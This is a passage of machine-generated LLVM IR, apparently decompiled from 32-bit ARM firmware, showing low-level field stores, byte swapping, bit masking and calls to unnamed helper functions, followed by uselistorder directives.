bb80:                                             ; preds = %dec_label_pc_9cfc, %bb79
  %v0_9de4 = load i32, i32* %r1.global-to-local, align 4
  %v1_9de4 = trunc i32 %v0_9de4 to i8
  %v2_9de4 = load i32, i32* @r4, align 4
  %v3_9de4 = add i32 %v2_9de4, 8
  %v4_9de4 = inttoptr i32 %v3_9de4 to i8*
  store i8 %v1_9de4, i8* %v4_9de4, align 1
  %v0_9de8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9de8 = trunc i32 %v0_9de8 to i8
  %v2_9de8 = load i32, i32* @r4, align 4
  %v3_9de8 = add i32 %v2_9de8, 9
  %v4_9de8 = inttoptr i32 %v3_9de8 to i8*
  store i8 %v1_9de8, i8* %v4_9de8, align 1
  %v0_9dec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dec, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_9dec = load i32, i32* %r2.global-to-local, align 4
  %v2_9dec = trunc i32 %v1_9dec to i16
  %v3_9dec = load i32, i32* @r4, align 4
  %v4_9dec = add i32 %v3_9dec, 6
  %v5_9dec = inttoptr i32 %v4_9dec to i16*
  store i16 %v2_9dec, i16* %v5_9dec, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32* %r2.global-to-local, align 4
  %v2_9df4 = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_9df4, i32* %r1.global-to-local, align 4
  %v1_9df8 = load i32, i32* @r4, align 4
  %v2_9df8 = add i32 %v1_9df8, 12
  %v3_9df8 = inttoptr i32 %v2_9df8 to i32*
  store i32 %v2_9df4, i32* %v3_9df8, align 4
  %v3_9dfc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dfc, i32* %r3.global-to-local, align 4
  store i32 %v2_98d8, i32* %ip.global-to-local, align 4
  %v4_9e04 = mul i32 %v3_9dfc, 16
  %v5_9e04 = add i32 %v4_9e04, %v2_98d8
  %v6_9e04 = inttoptr i32 %v5_9e04 to i32*
  %v7_9e04 = load i32, i32* %v6_9e04, align 4
  store i32 %v7_9e04, i32* %r2.global-to-local, align 4
  store i32 %v5_9e04, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r4, align 4
  %v2_9e10 = add i32 %v1_9e10, 16
  %v3_9e10 = inttoptr i32 %v2_9e10 to i32*
  store i32 %v7_9e04, i32* %v3_9e10, align 4
  %v0_9e14 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e14 = add i32 %v0_9e14, 12
  %v2_9e14 = inttoptr i32 %v1_9e14 to i16*
  %v3_9e14 = load i16, i16* %v2_9e14, align 2
  %v4_9e14 = zext i16 %v3_9e14 to i32
  store i32 %v4_9e14, i32* %r0.global-to-local, align 4
  %v1_9e18 = add i32 %v0_9e14, 8
  %v2_9e18 = inttoptr i32 %v1_9e18 to i32*
  %v3_9e18 = load i32, i32* %v2_9e18, align 4
  store i32 %v3_9e18, i32* %r1.global-to-local, align 4
  %v2_9e1c = load i32, i32* @r4, align 4
  %v3_9e1c = add i32 %v2_9e1c, 20
  %v4_9e1c = inttoptr i32 %v3_9e1c to i16*
  store i16 %v3_9e14, i16* %v4_9e1c, align 2
  %v0_9e20 = load i32, i32* @r4, align 4
  %v1_9e20 = add i32 %v0_9e20, 20
  store i32 %v1_9e20, i32* @r8, align 4
  %v1_9e24 = add i32 %v0_9e20, 33
  %v2_9e24 = inttoptr i32 %v1_9e24 to i8*
  %v3_9e24 = load i8, i8* %v2_9e24, align 1
  %v4_9e24 = zext i8 %v3_9e24 to i32
  store i32 %v4_9e24, i32* %r2.global-to-local, align 4
  %v0_9e28 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e28 = add i32 %v0_9e20, 24
  %v3_9e28 = inttoptr i32 %v2_9e28 to i32*
  store i32 %v0_9e28, i32* %v3_9e28, align 4
  %v0_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e2c = or i32 %v0_9e2c, 1
  store i32 %v1_9e2c, i32* %r2.global-to-local, align 4
  %v0_9e30 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e30 = add i32 %v0_9e30, 4
  %v2_9e30 = inttoptr i32 %v1_9e30 to i32*
  %v3_9e30 = load i32, i32* %v2_9e30, align 4
  store i32 %v3_9e30, i32* %r1.global-to-local, align 4
  %v1_9e34 = add i32 %v0_9e30, 14
  %v2_9e34 = inttoptr i32 %v1_9e34 to i16*
  %v3_9e34 = load i16, i16* %v2_9e34, align 2
  %v4_9e34 = zext i16 %v3_9e34 to i32
  store i32 %v4_9e34, i32* %r3.global-to-local, align 4
  %v1_9e38 = trunc i32 %v1_9e2c to i8
  %v2_9e38 = load i32, i32* @r8, align 4
  %v3_9e38 = add i32 %v2_9e38, 13
  %v4_9e38 = inttoptr i32 %v3_9e38 to i8*
  store i8 %v1_9e38, i8* %v4_9e38, align 1
  %v0_9e3c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e3c = trunc i32 %v0_9e3c to i16
  %v2_9e3c = load i32, i32* @r8, align 4
  %v3_9e3c = add i32 %v2_9e3c, 2
  %v4_9e3c = inttoptr i32 %v3_9e3c to i16*
  store i16 %v1_9e3c, i16* %v4_9e3c, align 2
  %v0_9e40 = load i32, i32* @r8, align 4
  %v1_9e40 = add i32 %v0_9e40, 12
  %v2_9e40 = inttoptr i32 %v1_9e40 to i8*
  %v3_9e40 = load i8, i8* %v2_9e40, align 1
  %v4_9e40 = zext i8 %v3_9e40 to i32
  store i32 %v4_9e40, i32* %r3.global-to-local, align 4
  %v1_9e44 = add i32 %v0_9e40, 13
  %v2_9e44 = inttoptr i32 %v1_9e44 to i8*
  %v3_9e44 = load i8, i8* %v2_9e44, align 1
  %v4_9e44 = zext i8 %v3_9e44 to i32
  %tmp104 = urem i8 %v3_9e40, 16
  %v1_9e48 = zext i8 %tmp104 to i32
  %v1_9e4c = or i32 %v1_9e48, 128
  store i32 %v1_9e4c, i32* %r3.global-to-local, align 4
  %v1_9e50 = or i32 %v4_9e44, 16
  store i32 %v1_9e50, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e54 = add i32 %v0_9e40, 8
  %v3_9e54 = inttoptr i32 %v2_9e54 to i32*
  store i32 %v0_9e54, i32* %v3_9e54, align 4
  %v0_9e58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e58 = trunc i32 %v0_9e58 to i8
  %v2_9e58 = load i32, i32* @r8, align 4
  %v3_9e58 = add i32 %v2_9e58, 12
  %v4_9e58 = inttoptr i32 %v3_9e58 to i8*
  store i8 %v1_9e58, i8* %v4_9e58, align 1
  %v0_9e5c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e5c = trunc i32 %v0_9e5c to i8
  %v2_9e5c = load i32, i32* @r8, align 4
  %v3_9e5c = add i32 %v2_9e5c, 13
  %v4_9e5c = inttoptr i32 %v3_9e5c to i8*
  store i8 %v1_9e5c, i8* %v4_9e5c, align 1
  %v0_9e60 = call i32 @function_e0b4()
  %v1_9e60 = trunc i32 %v0_9e60 to i16
  store i32 %v0_9e60, i32* %r0.global-to-local, align 4
  store i32 %v1_99a4, i32* %r1.global-to-local, align 4
  %v0_9e68 = load i32, i32* @r8, align 4
  %v1_9e68 = add i32 %v0_9e68, 13
  %v2_9e68 = inttoptr i32 %v1_9e68 to i8*
  %v3_9e68 = load i8, i8* %v2_9e68, align 1
  %v4_9e68 = zext i8 %v3_9e68 to i32
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v1_9e70 = and i32 %v4_9e68, 223
  %v5_9e74 = or i32 %v1_9e70, %v4_9e74
  store i32 %v5_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v5_9e74 to i8
  store i8 %v1_9e78, i8* %v2_9e68, align 1
  store i32 %v1_99c4, i32* %ip.global-to-local, align 4
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 13
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v1_9e84, i32* %r3.global-to-local, align 4
  %v1_9e88 = and i32 %v4_9e80, 239
  %v5_9e8c = or i32 %v1_9e88, %v4_9e8c
  store i32 %v5_9e8c, i32* %r2.global-to-local, align 4
  %v1_9e90 = trunc i32 %v5_9e8c to i8
  store i8 %v1_9e90, i8* %v2_9e80, align 1
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r8, align 4
  %v1_9e98 = add i32 %v0_9e98, 13
  %v2_9e98 = inttoptr i32 %v1_9e98 to i8*
  %v3_9e98 = load i8, i8* %v2_9e98, align 1
  %v4_9e98 = zext i8 %v3_9e98 to i32
  store i32 %v1_9e9c, i32* %r2.global-to-local, align 4
  %v1_9ea0 = and i32 %v4_9e98, 247
  %v5_9ea4 = or i32 %v1_9ea0, %v4_9ea4
  store i32 %v5_9ea4, i32* %r3.global-to-local, align 4
  %v1_9ea8 = trunc i32 %v5_9ea4 to i8
  store i8 %v1_9ea8, i8* %v2_9e98, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9eb0 = load i32, i32* @r8, align 4
  %v1_9eb0 = add i32 %v0_9eb0, 13
  %v2_9eb0 = inttoptr i32 %v1_9eb0 to i8*
  %v3_9eb0 = load i8, i8* %v2_9eb0, align 1
  %v4_9eb0 = zext i8 %v3_9eb0 to i32
  store i32 %v1_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = and i32 %v4_9eb0, 251
  %v5_9ebc = or i32 %v1_9eb8, %v4_9ebc
  store i32 %v5_9ebc, i32* %r2.global-to-local, align 4
  %v1_9ec0 = trunc i32 %v5_9ebc to i8
  store i8 %v1_9ec0, i8* %v2_9eb0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ec8 = load i32, i32* @r8, align 4
  %v1_9ec8 = add i32 %v0_9ec8, 13
  %v2_9ec8 = inttoptr i32 %v1_9ec8 to i8*
  %v3_9ec8 = load i8, i8* %v2_9ec8, align 1
  %v4_9ec8 = zext i8 %v3_9ec8 to i32
  store i32 %v1_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = and i32 %v4_9ec8, 253
  %v4_9ed4 = or i32 %v1_9ed0, %v3_9ed4
  store i32 %v4_9ed4, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v4_9ed4 to i8
  store i8 %v1_9ed8, i8* %v2_9ec8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r8, align 4
  %v1_9ee0 = add i32 %v0_9ee0, 13
  %v2_9ee0 = inttoptr i32 %v1_9ee0 to i8*
  %v3_9ee0 = load i8, i8* %v2_9ee0, align 1
  %v4_9ee0 = zext i8 %v3_9ee0 to i32
  %v1_9ee8 = and i32 %v4_9ee0, 254
  store i32 %v1_9ee8, i32* %r2.global-to-local, align 4
  %v2_9eec = or i32 %v1_9ee8, %v1_9ee4
  store i32 %v2_9eec, i32* %r3.global-to-local, align 4
  %v1_9ef0 = trunc i32 %v2_9eec to i8
  store i8 %v1_9ef0, i8* %v2_9ee0, align 1
  %v3_9ef4 = load i32, i32* @r8, align 4
  %v4_9ef4 = add i32 %v3_9ef4, 14
  %v5_9ef4 = inttoptr i32 %v4_9ef4 to i16*
  store i16 %v1_9e60, i16* %v5_9ef4, align 2
  store i32 %v6_9a5c, i32* %r1.global-to-local, align 4
  %v0_9efc = load i32, i32* @r4, align 4
  %v1_9efc = add i32 %v0_9efc, 40
  store i32 %v1_9efc, i32* %r0.global-to-local, align 4
  %v2_9f00 = inttoptr i32 %v1_9efc to i16*
  %v3_9f00 = call i32 @function_e248(i16* %v2_9f00, i32 %v6_9a5c)
  store i32 %v3_9f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c54

dec_label_pc_9f08:                                ; preds = %dec_label_pc_9ac8
  store i32 %v6_9a5c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a5c, 40
  br label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9f08
  %storemerge6.pre-phi = phi i32 [ %v1_9d58, %dec_label_pc_9c68 ], [ %.pre, %dec_label_pc_9f08 ]
  %v0_9f2c26 = phi i32 [ %v1_9c5c, %dec_label_pc_9c68 ], [ 0, %dec_label_pc_9f08 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a5c, 65536
  %storemerge = add i32 %v6_9a5c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f18 = add i32 %storemerge4, 1310720
  store i32 %v1_9f18, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_9f18, 256
  %v3_9f20 = and i32 %tmp83, 65280
  store i32 %v3_9f20, i32* %r3.global-to-local, align 4
  %v4_9f24 = udiv i32 %v1_9f18, 16777216
  %v5_9f24 = or i32 %v3_9f20, %v4_9f24
  store i32 %v5_9f24, i32* @r8, align 4
  %v2_a050 = icmp eq i32 %v1_9a7c, 0
  br label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %dec_label_pc_9f28, %dec_label_pc_a034, %dec_label_pc_9f18
  %v0_9f2c = phi i32 [ %v0_9f2c26, %dec_label_pc_9f18 ], [ 0, %dec_label_pc_a034 ], [ 0, %dec_label_pc_9f28 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f2c = icmp eq i32 %v0_9f2c, 0
  store i1 %v2_9f2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f2c, label %dec_label_pc_9f28, label %dec_label_pc_9f38

dec_label_pc_9f38:                                ; preds = %dec_label_pc_9f28, %dec_label_pc_a034
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f3c

dec_label_pc_9f3c:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9f38
  %v1_9f44 = phi i32 [ %v1_a024, %dec_label_pc_9f64 ], [ 0, %dec_label_pc_9f38 ]
  store i32 %v2_98e8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9f44 = mul i32 %v1_9f44, 4
  %v5_9f44 = add i32 %v4_9f44, %v2_98e8
  %v6_9f44 = inttoptr i32 %v5_9f44 to i32*
  %v7_9f44 = load i32, i32* %v6_9f44, align 4
  store i32 %v7_9f44, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9f4c = load i32, i32* @fp, align 4
  %v9_9f4c = icmp eq i32 %v0_9f4c, 65535
  store i1 %v9_9f4c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f50 = add i32 %v7_9f44, 20
  store i32 %v1_9f50, i32* @r5, align 4
  br i1 %v9_9f4c, label %dec_label_pc_a048, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f3c
  store i32 %v1_9a7c, i32* %r3.global-to-local, align 4
  store i1 %v2_a050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a050, label %dec_label_pc_9f64, label %dec_label_pc_a05c

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9f58, %dec_label_pc_a048, %dec_label_pc_a05c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9f68 = load i32, i32* @r4, align 4
  %v3_9f68 = add i32 %v2_9f68, 10
  %v4_9f68 = inttoptr i32 %v3_9f68 to i16*
  store i16 0, i16* %v4_9f68, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9f70 = load i32, i32* @r4, align 4
  store i32 %v0_9f70, i32* @r0, align 4
  %v2_9f74 = call i32 @function_c848(i32 %v0_9f70, i32 20)
  %v3_9f74 = trunc i32 %v2_9f74 to i16
  store i32 %v2_9f74, i32* %r0.global-to-local, align 4
  %v3_9f78 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_98d8, i32* %r2.global-to-local, align 4
  %v3_9f80 = mul i32 %v3_9f78, 16
  %v2_9f84 = add i32 %v3_9f80, %v2_98d8
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = add i32 %v2_9f84, 4
  %v2_9f88 = inttoptr i32 %v1_9f88 to i32*
  %v3_9f88 = load i32, i32* %v2_9f88, align 4
  %v3_9f8c = mul i32 %v3_9f88, 65536
  store i32 %v3_9f8c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_9f88, 256
  %v1_9f94 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9f88, 256
  %v4_9f98 = urem i32 %tmp86, 256
  %v5_9f98 = or i32 %v4_9f98, %v1_9f94
  store i32 %v5_9f98, i32* %r3.global-to-local, align 4
  %v1_9f9c = add i32 %v3_9f88, 1
  store i32 %v1_9f9c, i32* %r2.global-to-local, align 4
  store i32 %v1_9f9c, i32* %v2_9f88, align 4
  %v0_9fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fa4 = load i32, i32* @r5, align 4
  %v2_9fa4 = add i32 %v1_9fa4, 4
  %v3_9fa4 = inttoptr i32 %v2_9fa4 to i32*
  store i32 %v0_9fa4, i32* %v3_9fa4, align 4
  %v0_9fa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fa8 = add i32 %v0_9fa8, 8
  %v2_9fa8 = inttoptr i32 %v1_9fa8 to i32*
  %v3_9fa8 = load i32, i32* %v2_9fa8, align 4
  %tmp87 = mul i32 %v3_9fa8, 256
  %v1_9fb4 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_9fa8, 256
  %v4_9fb8 = urem i32 %tmp88, 256
  %v5_9fb8 = or i32 %v4_9fb8, %v1_9fb4
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 8
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb8, i32* %v3_9fbc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9fc4 = load i32, i32* @r4, align 4
  %v4_9fc4 = add i32 %v3_9fc4, 10
  %v5_9fc4 = inttoptr i32 %v4_9fc4 to i16*
  store i16 %v3_9f74, i16* %v5_9fc4, align 2
  %v0_9fc8 = load i32, i32* @r5, align 4
  store i32 %v0_9fc8, i32* @r1, align 4
  %v0_9fcc = load i32, i32* %r3.global-to-local, align 4
  %v1_9fcc = trunc i32 %v0_9fcc to i16
  %v3_9fcc = add i32 %v0_9fc8, 16
  %v4_9fcc = inttoptr i32 %v3_9fcc to i16*
  store i16 %v1_9fcc, i16* %v4_9fcc, align 2
  %v0_9fd0 = load i32, i32* @r8, align 4
  store i32 %v0_9fd0, i32* %r2.global-to-local, align 4
  %v0_9fd4 = load i32, i32* @sl, align 4
  store i32 %v0_9fd4, i32* %r3.global-to-local, align 4
  %v0_9fd8 = load i32, i32* @r4, align 4
  store i32 %v0_9fd8, i32* %r0.global-to-local, align 4
  %v4_9fdc = call i32 @function_c898(i32 %v0_9fd8, i32 %v0_9fc8, i32 %v0_9fd0, i32 %v0_9fd4)
  %v5_9fdc = trunc i32 %v4_9fdc to i16
  store i32 %v4_9fdc, i32* %r0.global-to-local, align 4
  %v3_9fe0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9fe0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_9fe8 = mul i32 %v3_9fe0, 32
  store i32 %v3_9fe8, i32* %lr.global-to-local, align 4
  %v3_9fec = load i32, i32* @r5, align 4
  %v4_9fec = add i32 %v3_9fec, 16
  %v5_9fec = inttoptr i32 %v4_9fec to i16*
  store i16 %v5_9fdc, i16* %v5_9fec, align 2
  %v0_9ff0 = load i32, i32* %lr.global-to-local, align 4
  %v1_9ff0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_9ff0, -8
  %v5_9ff0 = add i32 %v0_9ff0, %tmp105
  store i32 %v5_9ff0, i32* %lr.global-to-local, align 4
  %v0_9ff4 = load i32, i32* @r5, align 4
  %v1_9ff4 = add i32 %v0_9ff4, 2
  %v2_9ff4 = inttoptr i32 %v1_9ff4 to i16*
  %v3_9ff4 = load i16, i16* %v2_9ff4, align 2
  %v1_9ff8 = load i32, i32* %ip.global-to-local, align 4
  %v2_9ff8 = add i32 %v1_9ff8, %v5_9ff0
  store i32 %v2_9ff8, i32* @lr, align 4
  %v3_9ffc = add i32 %v2_9ff8, 2
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v3_9ff4, i16* %v4_9ffc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a008 = load i32, i32* @r4, align 4
  store i32 %v0_a008, i32* %r1.global-to-local, align 4
  %v0_a00c = load i32, i32* @sb, align 4
  store i32 %v0_a00c, i32* %r0.global-to-local, align 4
  %v0_a010 = load i32, i32* @r7, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @lr, align 4
  %v6_a01c = call i32 @function_11560(i32 %v0_a00c, i32 %v0_a008, i32 %v0_a010, i32 16384, i32 %v0_a014, i32 16)
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  %v1_a024 = add i32 %v3_a020, 1
  store i32 %v1_a024, i32* %r0.global-to-local, align 4
  %v0_a028 = load i32, i32* @r6, align 4
  %v9_a028 = icmp eq i32 %v0_a028, %v1_a024
  store i1 %v9_a028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a024, i32* %stack_var_-44, align 4
  %v8_a030 = icmp sgt i32 %v0_a028, %v1_a024
  br i1 %v8_a030, label %dec_label_pc_9f3c, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_9f64
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a038 = icmp eq i32 %v0_a028, 0
  store i1 %v2_a038, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a038, label %dec_label_pc_9f28, label %dec_label_pc_9f38

dec_label_pc_a048:                                ; preds = %dec_label_pc_9f3c
  %v0_a048 = call i32 @function_e0b4()
  %v1_a048 = trunc i32 %v0_a048 to i16
  store i32 %v0_a048, i32* %r0.global-to-local, align 4
  store i32 %v1_9a7c, i32* %r3.global-to-local, align 4
  store i1 %v2_a050, i1* %cpsr_z.global-to-local, align 1
  %v3_a054 = load i32, i32* @r4, align 4
  %v4_a054 = add i32 %v3_a054, 4
  %v5_a054 = inttoptr i32 %v4_a054 to i16*
  store i16 %v1_a048, i16* %v5_a054, align 2
  br i1 %v2_a050, label %dec_label_pc_9f64, label %dec_label_pc_a048.dec_label_pc_a05c_crit_edge

dec_label_pc_a048.dec_label_pc_a05c_crit_edge:    ; preds = %dec_label_pc_a048
  %v0_a05c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a05c

dec_label_pc_a05c:                                ; preds = %dec_label_pc_a048.dec_label_pc_a05c_crit_edge, %dec_label_pc_9f58
  %v0_a05c = phi i32 [ %v0_a05c.pre, %dec_label_pc_a048.dec_label_pc_a05c_crit_edge ], [ %v7_9f44, %dec_label_pc_9f58 ]
  %v1_a05c = add i32 %v0_a05c, 40
  store i32 %v1_a05c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a5c, i32* %r1.global-to-local, align 4
  %v2_a064 = inttoptr i32 %v1_a05c to i16*
  %v3_a064 = call i32 @function_e248(i16* %v2_a064, i32 %v6_9a5c)
  store i32 %v3_a064, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f64

; uselistorder directives
  uselistorder i32 %v0_a048, { 1, 0 }
  uselistorder i32 %v1_a024, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_9ff0, { 1, 0 }
  uselistorder i32 %v4_9fdc, { 1, 0 }
  uselistorder i32 %v3_9fa8, { 1, 0 }
  uselistorder i32 %v3_9f88, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9f74, { 1, 0 }
  uselistorder i1 %v2_a050, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9e60, { 1, 0 }
  uselistorder i32 %v0_9d98, { 1, 0 }
  uselistorder i32 %v5_9d2c, { 1, 0 }
  uselistorder i32 %v0_9cec, { 1, 0 }
  uselistorder i32 %v0_9ca8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c58, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c44, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9bd0, { 1, 0 }
  uselistorder i32 %v6_9bc8, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9bf8, { 1, 0 }
  uselistorder i32 %v4_9c0c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b54, { 1, 0, 2 }
  uselistorder i32 %v0_9d04, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b44, { 1, 0 }
  uselistorder i1 %v7_9b3c, { 1, 0, 2 }
  uselistorder i1 %v7_9af0, { 1, 0 }
  uselistorder i32 %v3_9aec, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9ecc, { 1, 0 }
  uselistorder i32 %v1_9eb4, { 1, 0 }
  uselistorder i32 %v1_9e9c, { 1, 0 }
  uselistorder i32 %v1_9e84, { 1, 0 }
  uselistorder i32 %v1_9e6c, { 1, 0 }
  uselistorder i32 %v3_9c04, { 1, 0 }
  uselistorder i1 %v2_9c20, { 1, 0 }
  uselistorder i32 %v1_9c1c, { 1, 0 }
  uselistorder i32 %v4_9c18, { 2, 0, 1 }
  uselistorder i32 %v2_9b2c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9ac8, { 1, 0 }
  uselistorder i1 %v7_9ac0, { 1, 0 }
  uselistorder i1 %v7_9a94, { 1, 0 }
  uselistorder i32 %v3_9a90, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9a7c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a5c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v1_99c4, { 1, 2, 0 }
  uselistorder i32 %v1_99a4, { 1, 2, 0 }
  uselistorder i32 %v6_9980, { 1, 0 }
  uselistorder i32 %v1_9968, { 1, 2, 0 }
  uselistorder i32 %v6_9900, { 2, 1, 3, 0 }
  uselistorder i32 %v2_98e8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_98d8, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 56, 33, 32, 34, 35, 36, 38, 37, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f38, { 1, 0 }
  uselistorder label %dec_label_pc_9f28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f18, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_9c84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c54, { 2, 0, 1 }
